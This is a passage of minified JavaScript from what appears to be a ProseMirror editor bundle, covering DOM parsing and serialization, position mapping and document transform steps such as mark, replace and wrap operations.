`),n)}ignoreFallback(e,n){e.nodeName=="BR"&&(!this.top.type||!this.top.type.inlineContent)&&this.findPlace(this.parser.schema.text("-"),n,!0)}readStyles(e,n){let r=e.style;if(r&&r.length)for(let i=0;i<this.parser.matchedStyles.length;i++){let s=this.parser.matchedStyles[i],o=r.getPropertyValue(s);if(o)for(let a=void 0;;){let l=this.parser.matchStyle(s,o,this,a);if(!l)break;if(l.ignore)return null;if(l.clearMark?n=n.filter(u=>!l.clearMark(u)):n=n.concat(this.parser.schema.marks[l.mark].create(l.attrs)),l.consuming===!1)a=l;else break}}return n}addElementByRule(e,n,r,i){let s,o;if(n.node)if(o=this.parser.schema.nodes[n.node],o.isLeaf)this.insertNode(o.create(n.attrs),r,e.nodeName=="BR")||this.leafFallback(e,r);else{let l=this.enter(o,n.attrs||null,r,n.preserveWhitespace);l&&(s=!0,r=l)}else{let l=this.parser.schema.marks[n.mark];r=r.concat(l.create(n.attrs))}let a=this.top;if(o&&o.isLeaf)this.findInside(e);else if(i)this.addElement(e,r,i);else if(n.getContent)this.findInside(e),n.getContent(e,this.parser.schema).forEach(l=>this.insertNode(l,r,!1));else{let l=e;typeof n.contentElement=="string"?l=e.querySelector(n.contentElement):typeof n.contentElement=="function"?l=n.contentElement(e):n.contentElement&&(l=n.contentElement),this.findAround(e,l,!0),this.addAll(l,r),this.findAround(e,l,!1)}s&&this.sync(a)&&this.open--}addAll(e,n,r,i){let s=r||0;for(let o=r?e.childNodes[r]:e.firstChild,a=i==null?null:e.childNodes[i];o!=a;o=o.nextSibling,++s)this.findAtPoint(e,s),this.addDOM(o,n);this.findAtPoint(e,s)}findPlace(e,n,r){let i,s;for(let o=this.open,a=0;o>=0;o--){let l=this.nodes[o],u=l.findWrapping(e);if(u&&(!i||i.length>u.length+a)&&(i=u,s=l,!u.length))break;if(l.solid){if(r)break;a+=2}}if(!i)return null;this.sync(s);for(let o=0;o<i.length;o++)n=this.enterInner(i[o],null,n,!1);return n}insertNode(e,n,r){if(e.isInline&&this.needsBlock&&!this.top.type){let s=this.textblockFromContext();s&&(n=this.enterInner(s,null,n))}let i=this.findPlace(e,n,r);if(i){this.closeExtra();let s=this.top;s.match&&(s.match=s.match.matchType(e.type));let o=ee.none;for(let a of i.concat(e.marks))(s.type?s.type.allowsMarkType(a.type):Zx(a.type,e.type))&&(o=a.addToSet(o));return s.content.push(e.mark(o)),!0}return!1}enter(e,n,r,i){let s=this.findPlace(e.create(n),r,!1);return s&&(s=this.enterInner(e,n,r,!0,i)),s}enterInner(e,n,r,i=!1,s){this.closeExtra();let o=this.top;o.match=o.match&&o.match.matchType(e);let a=Yx(e,s,o.options);o.options&No&&o.content.length==0&&(a|=No);let l=ee.none;return r=r.filter(u=>(o.type?o.type.allowsMarkType(u.type):Zx(u.type,e))?(l=u.addToSet(l),!1):!0),this.nodes.push(new fl(e,n,l,i,null,a)),this.open++,r}closeExtra(e=!1){let n=this.nodes.length-1;if(n>this.open){for(;n>this.open;n--)this.nodes[n-1].content.push(this.nodes[n].finish(e));this.nodes.length=this.open+1}}finish(){return this.open=0,this.closeExtra(this.isOpen),this.nodes[0].finish(!!(this.isOpen||this.options.topOpen))}sync(e){for(let n=this.open;n>=0;n--){if(this.nodes[n]==e)return this.open=n,!0;this.localPreserveWS&&(this.nodes[n].options|=da)}return!1}get currentPos(){this.closeExtra();let e=0;for(let n=this.open;n>=0;n--){let r=this.nodes[n].content;for(let i=r.length-1;i>=0;i--)e+=r[i].nodeSize;n&&e++}return e}findAtPoint(e,n){if(this.find)for(let r=0;r<this.find.length;r++)this.find[r].node==e&&this.find[r].offset==n&&(this.find[r].pos=this.currentPos)}findInside(e){if(this.find)for(let n=0;n<this.find.length;n++)this.find[n].pos==null&&e.nodeType==1&&e.contains(this.find[n].node)&&(this.find[n].pos=this.currentPos)}findAround(e,n,r){if(e!=n&&this.find)for(let i=0;i<this.find.length;i++)this.find[i].pos==null&&e.nodeType==1&&e.contains(this.find[i].node)&&n.compareDocumentPosition(this.find[i].node)&(r?2:4)&&(this.find[i].pos=this.currentPos)}findInText(e){if(this.find)for(let n=0;n<this.find.length;n++)this.find[n].node==e&&(this.find[n].pos=this.currentPos-(e.nodeValue.length-this.find[n].offset))}matchesContext(e){if(e.indexOf("|")>-1)return e.split(/\s*\|\s*/).some(this.matchesContext,this);let n=e.split("/"),r=this.options.context,i=!this.isOpen&&(!r||r.parent.type==this.nodes[0].type),s=-(r?r.depth+1:0)+(i?0:1),o=(a,l)=>{for(;a>=0;a--){let u=n[a];if(u==""){if(a==n.length-1||a==0)continue;for(;l>=s;l--)if(o(a-1,l))return!0;return!1}else{let c=l>0||l==0&&i?this.nodes[l].type:r&&l>=s?r.node(l-s).type:null;if(!c||c.name!=u&&!c.isInGroup(u))return!1;l--}}return!0};return o(n.length-1,this.open)}textblockFromContext(){let e=this.options.context;if(e)for(let n=e.depth;n>=0;n--){let r=e.node(n).contentMatchAt(e.indexAfter(n)).defaultType;if(r&&r.isTextblock&&r.defaultAttrs)return r}for(let n in this.parser.schema.nodes){let r=this.parser.schema.nodes[n];if(r.isTextblock&&r.defaultAttrs)return r}}}function Jj(t){for(let e=t.firstChild,n=null;e;e=e.nextSibling){let r=e.nodeType==1?e.nodeName.toLowerCase():null;r&&vC.hasOwnProperty(r)&&n?(n.appendChild(e),e=n):r=="li"?n=e:r&&(n=null)}}function Yj(t,e){return(t.matches||t.msMatchesSelector||t.webkitMatchesSelector||t.mozMatchesSelector).call(t,e)}function Xx(t){let e={};for(let n in t)e[n]=t[n];return e}function Zx(t,e){let n=e.schema.nodes;for(let r in n){let i=n[r];if(!i.allowsMarkType(t))continue;let s=[],o=a=>{s.push(a);for(let l=0;l<a.edgeCount;l++){let{type:u,next:c}=a.edge(l);if(u==e||s.indexOf(c)<0&&o(c))return!0}};if(o(i.contentMatch))return!0}}class Ai{constructor(e,n){this.nodes=e,this.marks=n}serializeFragment(e,n={},r){r||(r=tf(n).createDocumentFragment());let i=r,s=[];return e.forEach(o=>{if(s.length||o.marks.length){let a=0,l=0;for(;a<s.length&&l<o.marks.length;){let u=o.marks[l];if(!this.marks[u.type.name]){l++;continue}if(!u.eq(s[a][0])||u.type.spec.spanning===!1)break;a++,l++}for(;a<s.length;)i=s.pop()[1];for(;l<o.marks.length;){let u=o.marks[l++],c=this.serializeMark(u,o.isInline,n);c&&(s.push([u,i]),i.appendChild(c.dom),i=c.contentDOM||c.dom)}}i.appendChild(this.serializeNodeInner(o,n))}),r}serializeNodeInner(e,n){let{dom:r,contentDOM:i}=Hl(tf(n),this.nodes[e.type.name](e),null,e.attrs);if(i){if(e.isLeaf)throw new RangeError("Content hole not allowed in a leaf node spec");this.serializeFragment(e.content,n,i)}return r}serializeNode(e,n={}){let r=this.serializeNodeInner(e,n);for(let i=e.marks.length-1;i>=0;i--){let s=this.serializeMark(e.marks[i],e.isInline,n);s&&((s.contentDOM||s.dom).appendChild(r),r=s.dom)}return r}serializeMark(e,n,r={}){let i=this.marks[e.type.name];return i&&Hl(tf(r),i(e,n),null,e.attrs)}static renderSpec(e,n,r=null,i){return Hl(e,n,r,i)}static fromSchema(e){return e.cached.domSerializer||(e.cached.domSerializer=new Ai(this.nodesFromSchema(e),this.marksFromSchema(e)))}static nodesFromSchema(e){let n=ev(e.nodes);return n.text||(n.text=r=>r.text),n}static marksFromSchema(e){return ev(e.marks)}}function ev(t){let e={};for(let n in t){let r=t[n].spec.toDOM;r&&(e[n]=r)}return e}function tf(t){return t.document||window.document}const tv=new WeakMap;function Qj(t){let e=tv.get(t);return e===void 0&&tv.set(t,e=Xj(t)),e}function Xj(t){let e=null;function n(r){if(r&&typeof r=="object")if(Array.isArray(r))if(typeof r[0]=="string")e||(e=[]),e.push(r);else for(let i=0;i<r.length;i++)n(r[i]);else for(let i in r)n(r[i])}return n(t),e}function Hl(t,e,n,r){if(typeof e=="string")return{dom:t.createTextNode(e)};if(e.nodeType!=null)return{dom:e};if(e.dom&&e.dom.nodeType!=null)return e;let i=e[0],s;if(typeof i!="string")throw new RangeError("Invalid array passed to renderSpec");if(r&&(s=Qj(r))&&s.indexOf(e)>-1)throw new RangeError("Using an array from an attribute object as a DOM spec. This may be an attempted cross site scripting attack.");let o=i.indexOf(" ");o>0&&(n=i.slice(0,o),i=i.slice(o+1));let a,l=n?t.createElementNS(n,i):t.createElement(i),u=e[1],c=1;if(u&&typeof u=="object"&&u.nodeType==null&&!Array.isArray(u)){c=2;for(let d in u)if(u[d]!=null){let f=d.indexOf(" ");f>0?l.setAttributeNS(d.slice(0,f),d.slice(f+1),u[d]):d=="style"&&l.style?l.style.cssText=u[d]:l.setAttribute(d,u[d])}}for(let d=c;d<e.length;d++){let f=e[d];if(f===0){if(d<e.length-1||d>c)throw new RangeError("Content hole must be the only child of its parent node");return{dom:l,contentDOM:l}}else{let{dom:h,contentDOM:p}=Hl(t,f,n,r);if(l.appendChild(h),p){if(a)throw new RangeError("Multiple content holes");a=p}}}return{dom:l,contentDOM:a}}const wC=65535,SC=Math.pow(2,16);function Zj(t,e){return t+e*SC}function nv(t){return t&wC}function e3(t){return(t-(t&wC))/SC}const kC=1,bC=2,Ul=4,CC=8;class Qh{constructor(e,n,r){this.pos=e,this.delInfo=n,this.recover=r}get deleted(){return(this.delInfo&CC)>0}get deletedBefore(){return(this.delInfo&(kC|Ul))>0}get deletedAfter(){return(this.delInfo&(bC|Ul))>0}get deletedAcross(){return(this.delInfo&Ul)>0}}class Tt{constructor(e,n=!1){if(this.ranges=e,this.inverted=n,!e.length&&Tt.empty)return Tt.empty}recover(e){let n=0,r=nv(e);if(!this.inverted)for(let i=0;i<r;i++)n+=this.ranges[i*3+2]-this.ranges[i*3+1];return this.ranges[r*3]+n+e3(e)}mapResult(e,n=1){return this._map(e,n,!1)}map(e,n=1){return this._map(e,n,!0)}_map(e,n,r){let i=0,s=this.inverted?2:1,o=this.inverted?1:2;for(let a=0;a<this.ranges.length;a+=3){let l=this.ranges[a]-(this.inverted?i:0);if(l>e)break;let u=this.ranges[a+s],c=this.ranges[a+o],d=l+u;if(e<=d){let f=u?e==l?-1:e==d?1:n:n,h=l+i+(f<0?0:c);if(r)return h;let p=e==(n<0?l:d)?null:Zj(a/3,e-l),y=e==l?bC:e==d?kC:Ul;return(n<0?e!=l:e!=d)&&(y|=CC),new Qh(h,y,p)}i+=c-u}return r?e+i:new Qh(e+i,0,null)}touches(e,n){let r=0,i=nv(n),s=this.inverted?2:1,o=this.inverted?1:2;for(let a=0;a<this.ranges.length;a+=3){let l=this.ranges[a]-(this.inverted?r:0);if(l>e)break;let u=this.ranges[a+s],c=l+u;if(e<=c&&a==i*3)return!0;r+=this.ranges[a+o]-u}return!1}forEach(e){let n=this.inverted?2:1,r=this.inverted?1:2;for(let i=0,s=0;i<this.ranges.length;i+=3){let o=this.ranges[i],a=o-(this.inverted?s:0),l=o+(this.inverted?0:s),u=this.ranges[i+n],c=this.ranges[i+r];e(a,a+u,l,l+c),s+=c-u}}invert(){return new Tt(this.ranges,!this.inverted)}toString(){return(this.inverted?"-":"")+JSON.stringify(this.ranges)}static offset(e){return e==0?Tt.empty:new Tt(e<0?[0,-e,0]:[0,0,e])}}Tt.empty=new Tt([]);class fa{constructor(e,n,r=0,i=e?e.length:0){this.mirror=n,this.from=r,this.to=i,this._maps=e||[],this.ownData=!(e||n)}get maps(){return this._maps}slice(e=0,n=this.maps.length){return new fa(this._maps,this.mirror,e,n)}appendMap(e,n){this.ownData||(this._maps=this._maps.slice(),this.mirror=this.mirror&&this.mirror.slice(),this.ownData=!0),this.to=this._maps.push(e),n!=null&&this.setMirror(this._maps.length-1,n)}appendMapping(e){for(let n=0,r=this._maps.length;n<e._maps.length;n++){let i=e.getMirror(n);this.appendMap(e._maps[n],i!=null&&i<n?r+i:void 0)}}getMirror(e){if(this.mirror){for(let n=0;n<this.mirror.length;n++)if(this.mirror[n]==e)return this.mirror[n+(n%2?-1:1)]}}setMirror(e,n){this.mirror||(this.mirror=[]),this.mirror.push(e,n)}appendMappingInverted(e){for(let n=e.maps.length-1,r=this._maps.length+e._maps.length;n>=0;n--){let i=e.getMirror(n);this.appendMap(e._maps[n].invert(),i!=null&&i>n?r-i-1:void 0)}}invert(){let e=new fa;return e.appendMappingInverted(this),e}map(e,n=1){if(this.mirror)return this._map(e,n,!0);for(let r=this.from;r<this.to;r++)e=this._maps[r].map(e,n);return e}mapResult(e,n=1){return this._map(e,n,!1)}_map(e,n,r){let i=0;for(let s=this.from;s<this.to;s++){let o=this._maps[s],a=o.mapResult(e,n);if(a.recover!=null){let l=this.getMirror(s);if(l!=null&&l>s&&l<this.to){s=l,e=this._maps[l].recover(a.recover);continue}}i|=a.delInfo,e=a.pos}return r?e:new Qh(e,i,null)}}const nf=Object.create(null);class rt{getMap(){return Tt.empty}merge(e){return null}static fromJSON(e,n){if(!n||!n.stepType)throw new RangeError("Invalid input for Step.fromJSON");let r=nf[n.stepType];if(!r)throw new RangeError(`No step type ${n.stepType} defined`);return r.fromJSON(e,n)}static jsonID(e,n){if(e in nf)throw new RangeError("Duplicate use of step JSON ID "+e);return nf[e]=n,n.prototype.jsonID=e,n}}class Te{constructor(e,n){this.doc=e,this.failed=n}static ok(e){return new Te(e,null)}static fail(e){return new Te(null,e)}static fromReplace(e,n,r,i){try{return Te.ok(e.replace(n,r,i))}catch(s){if(s instanceof Nu)return Te.fail(s.message);throw s}}}function hg(t,e,n){let r=[];for(let i=0;i<t.childCount;i++){let s=t.child(i);s.content.size&&(s=s.copy(hg(s.content,e,s))),s.isInline&&(s=e(s,n,i)),r.push(s)}return A.fromArray(r)}class hr extends rt{constructor(e,n,r){super(),this.from=e,this.to=n,this.mark=r}apply(e){let n=e.slice(this.from,this.to),r=e.resolve(this.from),i=r.node(r.sharedDepth(this.to)),s=new L(hg(n.content,(o,a)=>!o.isAtom||!a.type.allowsMarkType(this.mark.type)?o:o.mark(this.mark.addToSet(o.marks)),i),n.openStart,n.openEnd);return Te.fromReplace(e,this.from,this.to,s)}invert(){return new tn(this.from,this.to,this.mark)}map(e){let n=e.mapResult(this.from,1),r=e.mapResult(this.to,-1);return n.deleted&&r.deleted||n.pos>=r.pos?null:new hr(n.pos,r.pos,this.mark)}merge(e){return e instanceof hr&&e.mark.eq(this.mark)&&this.from<=e.to&&this.to>=e.from?new hr(Math.min(this.from,e.from),Math.max(this.to,e.to),this.mark):null}toJSON(){return{stepType:"addMark",mark:this.mark.toJSON(),from:this.from,to:this.to}}static fromJSON(e,n){if(typeof n.from!="number"||typeof n.to!="number")throw new RangeError("Invalid input for AddMarkStep.fromJSON");return new hr(n.from,n.to,e.markFromJSON(n.mark))}}rt.jsonID("addMark",hr);class tn extends rt{constructor(e,n,r){super(),this.from=e,this.to=n,this.mark=r}apply(e){let n=e.slice(this.from,this.to),r=new L(hg(n.content,i=>i.mark(this.mark.removeFromSet(i.marks)),e),n.openStart,n.openEnd);return Te.fromReplace(e,this.from,this.to,r)}invert(){return new hr(this.from,this.to,this.mark)}map(e){let n=e.mapResult(this.from,1),r=e.mapResult(this.to,-1);return n.deleted&&r.deleted||n.pos>=r.pos?null:new tn(n.pos,r.pos,this.mark)}merge(e){return e instanceof tn&&e.mark.eq(this.mark)&&this.from<=e.to&&this.to>=e.from?new tn(Math.min(this.from,e.from),Math.max(this.to,e.to),this.mark):null}toJSON(){return{stepType:"removeMark",mark:this.mark.toJSON(),from:this.from,to:this.to}}static fromJSON(e,n){if(typeof n.from!="number"||typeof n.to!="number")throw new RangeError("Invalid input for RemoveMarkStep.fromJSON");return new tn(n.from,n.to,e.markFromJSON(n.mark))}}rt.jsonID("removeMark",tn);class pr extends rt{constructor(e,n){super(),this.pos=e,this.mark=n}apply(e){let n=e.nodeAt(this.pos);if(!n)return Te.fail("No node at mark step's position");let r=n.type.create(n.attrs,null,this.mark.addToSet(n.marks));return Te.fromReplace(e,this.pos,this.pos+1,new L(A.from(r),0,n.isLeaf?0:1))}invert(e){let n=e.nodeAt(this.pos);if(n){let r=this.mark.addToSet(n.marks);if(r.length==n.marks.length){for(let i=0;i<n.marks.length;i++)if(!n.marks[i].isInSet(r))return new pr(this.pos,n.marks[i]);return new pr(this.pos,this.mark)}}return new ki(this.pos,this.mark)}map(e){let n=e.mapResult(this.pos,1);return n.deletedAfter?null:new pr(n.pos,this.mark)}toJSON(){return{stepType:"addNodeMark",pos:this.pos,mark:this.mark.toJSON()}}static fromJSON(e,n){if(typeof n.pos!="number")throw new RangeError("Invalid input for AddNodeMarkStep.fromJSON");return new pr(n.pos,e.markFromJSON(n.mark))}}rt.jsonID("addNodeMark",pr);class ki extends rt{constructor(e,n){super(),this.pos=e,this.mark=n}apply(e){let n=e.nodeAt(this.pos);if(!n)return Te.fail("No node at mark step's position");let r=n.type.create(n.attrs,null,this.mark.removeFromSet(n.marks));return Te.fromReplace(e,this.pos,this.pos+1,new L(A.from(r),0,n.isLeaf?0:1))}invert(e){let n=e.nodeAt(this.pos);return!n||!this.mark.isInSet(n.marks)?this:new pr(this.pos,this.mark)}map(e){let n=e.mapResult(this.pos,1);return n.deletedAfter?null:new ki(n.pos,this.mark)}toJSON(){return{stepType:"removeNodeMark",pos:this.pos,mark:this.mark.toJSON()}}static fromJSON(e,n){if(typeof n.pos!="number")throw new RangeError("Invalid input for RemoveNodeMarkStep.fromJSON");return new ki(n.pos,e.markFromJSON(n.mark))}}rt.jsonID("removeNodeMark",ki);class Ie extends rt{constructor(e,n,r,i=!1){super(),this.from=e,this.to=n,this.slice=r,this.structure=i}apply(e){return this.structure&&Xh(e,this.from,this.to)?Te.fail("Structure replace would overwrite content"):Te.fromReplace(e,this.from,this.to,this.slice)}getMap(){return new Tt([this.from,this.to-this.from,this.slice.size])}invert(e){return new Ie(this.from,this.from+this.slice.size,e.slice(this.from,this.to))}map(e){let n=e.mapResult(this.from,1),r=e.mapResult(this.to,-1);return n.deletedAcross&&r.deletedAcross?null:new Ie(n.pos,Math.max(n.pos,r.pos),this.slice,this.structure)}merge(e){if(!(e instanceof Ie)||e.structure||this.structure)return null;if(this.from+this.slice.size==e.from&&!this.slice.openEnd&&!e.slice.openStart){let n=this.slice.size+e.slice.size==0?L.empty:new L(this.slice.content.append(e.slice.content),this.slice.openStart,e.slice.openEnd);return new Ie(this.from,this.to+(e.to-e.from),n,this.structure)}else if(e.to==this.from&&!this.slice.openStart&&!e.slice.openEnd){let n=this.slice.size+e.slice.size==0?L.empty:new L(e.slice.content.append(this.slice.content),e.slice.openStart,this.slice.openEnd);return new Ie(e.from,this.to,n,this.structure)}else return null}toJSON(){let e={stepType:"replace",from:this.from,to:this.to};return this.slice.size&&(e.slice=this.slice.toJSON()),this.structure&&(e.structure=!0),e}static fromJSON(e,n){if(typeof n.from!="number"||typeof n.to!="number")throw new RangeError("Invalid input for ReplaceStep.fromJSON");return new Ie(n.from,n.to,L.fromJSON(e,n.slice),!!n.structure)}}rt.jsonID("replace",Ie);class Fe extends rt{constructor(e,n,r,i,s,o,a=!1){super(),this.from=e,this.to=n,this.gapFrom=r,this.gapTo=i,this.slice=s,this.insert=o,this.structure=a}apply(e){if(this.structure&&(Xh(e,this.from,this.gapFrom)||Xh(e,this.gapTo,this.to)))return Te.fail("Structure gap-replace would overwrite content");let n=e.slice(this.gapFrom,this.gapTo);if(n.openStart||n.openEnd)return Te.fail("Gap is not a flat range");let r=this.slice.insertAt(this.insert,n.content);return r?Te.fromReplace(e,this.from,this.to,r):Te.fail("Content does not fit in gap")}getMap(){return new Tt([this.from,this.gapFrom-this.from,this.insert,this.gapTo,this.to-this.gapTo,this.slice.size-this.insert])}invert(e){let n=this.gapTo-this.gapFrom;return new Fe(this.from,this.from+this.slice.size+n,this.from+this.insert,this.from+this.insert+n,e.slice(this.from,this.to).removeBetween(this.gapFrom-this.from,this.gapTo-this.from),this.gapFrom-this.from,this.structure)}map(e){let n=e.mapResult(this.from,1),r=e.mapResult(this.to,-1),i=this.from==this.gapFrom?n.pos:e.map(this.gapFrom,-1),s=this.to==this.gapTo?r.pos:e.map(this.gapTo,1);return n.deletedAcross&&r.deletedAcross||i<n.pos||s>r.pos?null:new Fe(n.pos,r.pos,i,s,this.slice,this.insert,this.structure)}toJSON(){let e={stepType:"replaceAround",from:this.from,to:this.to,gapFrom:this.gapFrom,gapTo:this.gapTo,insert:this.insert};return this.slice.size&&(e.slice=this.slice.toJSON()),this.structure&&(e.structure=!0),e}static fromJSON(e,n){if(typeof n.from!="number"||typeof n.to!="number"||typeof n.gapFrom!="number"||typeof n.gapTo!="number"||typeof n.insert!="number")throw new RangeError("Invalid input for ReplaceAroundStep.fromJSON");return new Fe(n.from,n.to,n.gapFrom,n.gapTo,L.fromJSON(e,n.slice),n.insert,!!n.structure)}}rt.jsonID("replaceAround",Fe);function Xh(t,e,n){let r=t.resolve(e),i=n-e,s=r.depth;for(;i>0&&s>0&&r.indexAfter(s)==r.node(s).childCount;)s--,i--;if(i>0){let o=r.node(s).maybeChild(r.indexAfter(s));for(;i>0;){if(!o||o.isLeaf)return!0;o=o.firstChild,i--}}return!1}function t3(t,e,n,r){let i=[],s=[],o,a;t.doc.nodesBetween(e,n,(l,u,c)=>{if(!l.isInline)return;let d=l.marks;if(!r.isInSet(d)&&c.type.allowsMarkType(r.type)){let f=Math.max(u,e),h=Math.min(u+l.nodeSize,n),p=r.addToSet(d);for(let y=0;y<d.length;y++)d[y].isInSet(p)||(o&&o.to==f&&o.mark.eq(d[y])?o.to=h:i.push(o=new tn(f,h,d[y])));a&&a.to==f?a.to=h:s.push(a=new hr(f,h,r))}}),i.forEach(l=>t.step(l)),s.forEach(l=>t.step(l))}function n3(t,e,n,r){let i=[],s=0;t.doc.nodesBetween(e,n,(o,a)=>{if(!o.isInline)return;s++;let l=null;if(r instanceof Uc){let u=o.marks,c;for(;c=r.isInSet(u);)(l||(l=[])).push(c),u=c.removeFromSet(u)}else r?r.isInSet(o.marks)&&(l=[r]):l=o.marks;if(l&&l.length){let u=Math.min(a+o.nodeSize,n);for(let c=0;c<l.length;c++){let d=l[c],f;for(let h=0;h<i.length;h++){let p=i[h];p.step==s-1&&d.eq(i[h].style)&&(f=p)}f?(f.to=u,f.step=s):i.push({style:d,from:Math.max(a,e),to:u,step:s})}}}),i.forEach(o=>t.step(new tn(o.from,o.to,o.style)))}function pg(t,e,n,r=n.contentMatch,i=!0){let s=t.doc.nodeAt(e),o=[],a=e+1;for(let l=0;l<s.childCount;l++){let u=s.child(l),c=a+u.nodeSize,d=r.matchType(u.type);if(!d)o.push(new Ie(a,c,L.empty));else{r=d;for(let f=0;f<u.marks.length;f++)n.allowsMarkType(u.marks[f].type)||t.step(new tn(a,c,u.marks[f]));if(i&&u.isText&&n.whitespace!="pre"){let f,h=/\r?\n|\r/g,p;for(;f=h.exec(u.text);)p||(p=new L(A.from(n.schema.text(" ",n.allowedMarks(u.marks))),0,0)),o.push(new Ie(a+f.index,a+f.index+f[0].length,p))}}a=c}if(!r.validEnd){let l=r.fillBefore(A.empty,!0);t.replace(a,a,new L(l,0,0))}for(let l=o.length-1;l>=0;l--)t.step(o[l])}function r3(t,e,n){return(e==0||t.canReplace(e,t.childCount))&&(n==t.childCount||t.canReplace(0,n))}function _s(t){let n=t.parent.content.cutByIndex(t.startIndex,t.endIndex);for(let r=t.depth;;--r){let i=t.$from.node(r),s=t.$from.index(r),o=t.$to.indexAfter(r);if(r<t.depth&&i.canReplace(s,o,n))return r;if(r==0||i.type.spec.isolating||!r3(i,s,o))break}return null}function i3(t,e,n){let{$from:r,$to:i,depth:s}=e,o=r.before(s+1),a=i.after(s+1),l=o,u=a,c=A.empty,d=0;for(let p=s,y=!1;p>n;p--)y||r.index(p)>0?(y=!0,c=A.from(r.node(p).copy(c)),d++):l--;let f=A.empty,h=0;for(let p=s,y=!1;p>n;p--)y||i.after(p+1)<i.end(p)?(y=!0,f=A.from(i.node(p).copy(f)),h++):u++;t.step(new Fe(l,u,o,a,new L(c.append(f),d,h),c.size-d,!0))}function mg(t,e,n=null,r=t){let i=s3(t,e),s=i&&o3(r,e);return s?i.map(rv).concat({type:e,attrs:n}).concat(s.map(rv)):null}function rv(t){return{type:t,attrs:null}}function s3(t,e){let{parent:n,startIndex:r,endIndex:i}=t,s=n.contentMatchAt(r).findWrapping(e);if(!s)return null;let o=s.length?s[0]:e;return n.canReplaceWith(r,i,o)?s:null}function o3(t,e){let{parent:n,startIndex:r,endIndex:i}=t,s=n.child(r),o=e.contentMatch.findWrapping(s.type);if(!o)return null;let l=(o.length?o[o.length-1]:e).contentMatch;for(let u=r;l&&u<i;u++)l=l.matchType(n.child(u).type);return!l||!l.validEnd?null:o}function a3(t,e,n){let r=A.empty;for(let o=n.length-1;o>=0;o--){if(r.size){let a=n[o].type.contentMatch.matchFragment(r);if(!a||!a.validEnd)throw new RangeError("Wrapper type given to Transform.wrap does not form valid content of its parent wrapper")}r=A.from(n[o].type.create(n[o].attrs,r))}let i=e.start,s=e.end;t.step(new Fe(i,s,i,s,new L(r,0,0),n.length,!0))}function l3(t,e,n,r,i){if(!r.isTextblock)throw new RangeError("Type given to setBlockType should be a textblock");let s=t.steps.length;t.doc.nodesBetween(e,n,(o,a)=>{let l=typeof i=="function"?i(o):i;if(o.isTextblock&&!o.hasMarkup(r,l)&&u3(t.doc,t.mapping.slice(s).map(a),r)){let u=null;if(r.schema.linebreakReplacement){let h=r.whitespace=="pre",p=!!r.contentMatch.matchType(r.schema.linebreakReplacement);h&&!p?u=!1:!h&&p&&(u=!0)}u===!1&&TC(t,o,a,s),pg(t,t.mapping.slice(s).map(a,1),r,void 0,u===null);let c=t.mapping.slice(s),d=c.map(a,1),f=c.map(a+o.nodeSize,1);return t.step(new Fe(d,f,d+1,f-1,new L(A.from(r.create(l,null,o.marks)),0,0),1,!0)),u===!0&&EC(t,o,a,s),!1}})}function EC(t,e,n,r){e.forEach((i,s)=>{if(i.isText){let o,a=/\r?\n|\r/g;for(;o=a.exec(i.text);){let l=t.mapping.slice(r).map(n+1+s+o.index);t.replaceWith(l,l+1,e.type.schema.linebreakReplacement.create())}}})}function TC(t,e,n,r){e.forEach((i,s)=>{if(i.type==i.type.schema.linebreakReplacement){let o=t.mapping.slice(r).map(n+1+s);t.replaceWith(o,o+1,e.type.schema.text(`
`))}})}function u3(t,e,n){let r=t.resolve(e),i=r.index();return r.parent.canReplaceWith(i,i+1,n)}function c3(t,e,n,r,i){let s=t.doc.nodeAt(e);if(!s)throw new RangeError("No node at given position");n||(n=s.type);let o=n.create(r,null,i||s.marks);if(s.isLeaf)return t.replaceWith(e,e+s.nodeSize,o);if(!n.validContent(s.content))throw new RangeError("Invalid content for node type "+n.name);t.step(new Fe(e,e+s.nodeSize,e+1,e+s.nodeSize-1,new L(A.from(o),0,0),1,!0))}function cs(t,e,n=1,r){let i=t.resolve(e),s=i.depth-n,o=r&&r[r.length-1]||i.parent;if(s<0||i.parent.type.spec.isolating||!i.parent.canReplace(i.index(),i.parent.childCount)||!o.type.validContent(i.parent.content.cutByIndex(i.index(),i.parent.childCount)))return!1;for(let u=i.depth-1,c=n-2;u>s;u--,c--){let d=i.node(u),f=i.index(u);if(d.type.spec.isolating)return!1;let h=d.content.cutByIndex(f,d.childCount),p=r&&r[c+1];p&&(h=h.replaceChild(0,p.type.create(p.attrs)));let y=r&&r[c]||d;if(!d.canReplace(f+1,d.childCount)||!y.type.validContent(h))return!1}let a=i.indexAfter(s),l=r&&r[0];return i.node(s).canReplaceWith(a,a,l?l.type:i.node(s+1).type)}function d3(t,e,n=1,r){let i=t.doc.resolve(e),s=A.empty,o=A.empty;for(let a=i.depth,l=i.depth-n,u=n-1;a>l;a--,u--){s=A.from(i.node(a).copy(s));let c=r&&r[u];o=A.from(c?c.type.create(c.attrs,o):i.node(a).copy(o))}t.step(new Ie(e,e,new L(s.append(o),n,n),!0))}function Vr(t,e){let n=t.resolve(e),r=n.index();return MC(n.nodeBefore,n.nodeAfter)&&n.parent.canReplace(r,r+1)}function f3(t,e){e.content.size||t.type.compatibleContent(e.type);let n=t.contentMatchAt(t.childCount),{linebreakReplacement:r}=t.type.schema;for(let i=0;i<e.childCount;i++){let s=e.child(i),o=s.type==r?t.type.schema.nodes.text:s.type;if(n=n.matchType(o),!n||!t.type.allowsMarks(s.marks))return!1}return n.validEnd}function MC(t,e){return!!(t&&e&&!t.isLeaf&&f3(t,e))}function Wc(t,e,n=-1){let r=t.resolve(e);for(let i=r.depth;;i--){let s,o,a=r.index(i);if(i==r.depth?(s=r.nodeBefore,o=r.nodeAfter):n>0?(s=r.node(i+1),a++,o=r.node(i).maybeChild(a)):(s=r.node(i).maybeChild(a-1),o=r.node(i+1)),s&&!s.isTextblock&&MC(s,o)&&r.node(i).canReplace(a,a+1))return e;if(i==0)break;e=n<0?r.before(i):r.after(i)}}function h3(t,e,n){let r=null,{linebreakReplacement:i}=t.doc.type.schema,s=t.doc.resolve(e-n),o=s.node().type;if(i&&o.inlineContent){let c=o.whitespace=="pre",d=!!o.contentMatch.matchType(i);c&&!d?r=!1:!c&&d&&(r=!0)}let a=t.steps.length;if(r===!1){let c=t.doc.resolve(e+n);TC(t,c.node(),c.before(),a)}o.inlineContent&&pg(t,e+n-1,o,s.node().contentMatchAt(s.index()),r==null);let l=t.mapping.slice(a),u=l.map(e-n);if(t.step(new Ie(u,l.map(e+n,-1),L.empty,!0)),r===!0){let c=t.doc.resolve(u);EC(t,c.node(),c.before(),t.steps.length)}return t}function p3(t,e,n){let r=t.resolve(e);if(r.parent.canReplaceWith(r.index(),r.index(),n))return e;if(r.parentOffset==0)for(let i=r.depth-1;i>=0;i--){let 